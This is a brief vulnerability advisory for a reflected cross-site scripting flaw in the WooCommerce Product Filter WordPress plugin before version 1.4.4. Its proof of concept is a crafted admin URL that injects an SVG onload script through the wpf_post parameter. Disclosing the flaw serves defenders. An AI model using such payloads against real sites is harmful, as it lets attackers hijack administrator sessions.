## WordPress Plugin Vulnerabilities

# WooCommerce Product Filter < 1.4.4 - Reflected XSS

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open the URL below (the filter with the slug test1 needs to exist):
https://example.com/wp-admin/admin.php?page=wpf\_search&action=delete&paged=1&wpf\_post[]=test1&wpf\_post[]=<svg/onload=alert(/XSS/)>&action2=delete
